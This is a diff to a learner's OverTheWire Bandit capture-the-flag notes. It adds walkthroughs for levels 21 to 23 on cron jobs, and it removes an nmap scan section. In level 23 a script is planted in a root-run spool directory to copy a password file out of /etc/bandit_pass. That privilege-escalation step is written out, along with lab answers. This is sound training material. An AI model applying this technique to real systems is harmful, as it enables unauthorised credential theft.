@@ -189,16 +189,46 @@ nc -l -p 54321
 # The suconnect program connects to the listener on port 54321 and sends the password for bandit21
 # Lesson: netcat can be used to create local sockets for inter-process communication
 #         This technique is useful for testing and debugging services that require multiple connections
+#
+#
+# --- LEVEL 21: Scheduled Background Tasks (Cron) ---
+# WHAT I DID: Audited system cron schedules and traced automated script outputs.
+cd /etc/cron.d
+cat cronjob_bandit22
+# The configuration file pointed to an active script running on a 1-minute interval.
+cat /usr/bin/cronjob_bandit22.sh
+# Reading the script code revealed the static text file destination where the password leaks.
+cat /tmp/t7O6RIUz9U37N7Y6BBgYST68g7vEsR9O
+# Lesson: System schedulers are highly predictable if configurations are left globally readable.
+
+# --- LEVEL 22: Decoding Runtime Script Logic ---
+# WHAT I DID: Simulated hashing variables natively to predict a dynamic destination.
+cat /usr/bin/cronjob_bandit23.sh
+# The code maps a dynamic file generation path using an MD5 check on user parameters.
+# Replicated the hash loop directly inside the interactive terminal to calculate the filename:
+echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
+# Used the generated hash output to pinpoint and open the hidden flag file:
+cat /tmp/8169b67bd894dd1e9301dd9745648579
+# Lesson: Security through obscurity fails when the logic to build the secret is fully exposed.
+
+# --- LEVEL 23: Script Injection & Privilege Delegation ---
+# WHAT I DID: Created an exfiltration script and staged it for automated root-level execution.
+# Created a script payload inside a globally writable sandbox folder:
+cd /tmp
+nano myscript.sh
+# [Script contents]:
+# #!/bin/bash
+# cat /etc/bandit_pass/bandit24 > /tmp/my_secret_flag.txt
+#
+# Opened global read/write/execute flags so the scheduler daemon could process it:
+chmod 777 myscript.sh
+# Moved the payload to the specific spool directory watched by the automated root process:
+cp myscript.sh /var/spool/bandit24/foo/
+# Allowed 60 seconds for the system alarm clock to cycle, execute the script, and drop the key:
+cat /tmp/my_secret_flag.txt
+# Lesson: Writable spool pathways coupled with high-privilege runners invite arbitrary code execution.
 
 
-
-# =====================================================================
-# SYSTEM SECURITY AUDITING (NMAP EXECUTIONS)
-# =====================================================================
-
-# SYSTEM AUDIT: Profile local hardware environment attack surface vulnerabilities.
-# WHAT I DID: Ran an inside-out network mapping scan using the Windows binary path.
-& "C:\Program Files (x86)\Nmap\nmap.exe" -sV 127.0.0.1
 
 
 # =============================================================
